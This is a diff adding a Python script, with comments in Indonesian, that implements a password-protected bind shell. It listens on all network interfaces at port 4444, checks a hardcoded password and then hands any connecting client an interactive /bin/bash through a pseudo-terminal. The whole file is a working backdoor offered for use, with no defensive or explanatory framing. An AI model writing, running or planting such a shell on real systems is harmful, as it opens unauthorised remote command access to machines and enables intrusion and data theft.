@@ -1,0 +1,64 @@
+import socket
+import subprocess
+import os
+import pty
+import sys
+
+# KONFIGURASI
+HOST = '0.0.0.0'      # Ubah ke '127.0.0.1' untuk lokal only
+PORT = 4444           # Ganti port sesuai kebutuhan
+PASSWORD = 'hxc21'
+
+def handle_client(client_socket):
+    try:
+        client_socket.send(b"Password: ")
+        auth = client_socket.recv(1024).decode().strip()
+        
+        if auth != PASSWORD:
+            client_socket.send(b"Authentication failed!\n")
+            client_socket.close()
+            return
+        
+        client_socket.send(b"Authentication successful!\n")
+        client_socket.send(b"Spawning shell...\n\n")
+        
+        # Spawn proper shell dengan PTY
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/bash")
+        
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        client_socket.close()
+
+def main():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    try:
+        server.bind((HOST, PORT))
+        server.listen(5)
+        print(f"[*] Bind shell listening on {HOST}:{PORT}")
+        print(f"[*] Password: {PASSWORD}")
+        
+        if HOST == '0.0.0.0':
+            print("[*] Accessible from network")
+        else:
+            print("[*] Accessible locally only")
+        
+        while True:
+            client, addr = server.accept()
+            print(f"[+] Connection from {addr[0]}:{addr[1]}")
+            handle_client(client)
+            
+    except KeyboardInterrupt:
+        print("\n[!] Shutting down...")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+    finally:
+        server.close()
+
+if __name__ == "__main__":
+    main()
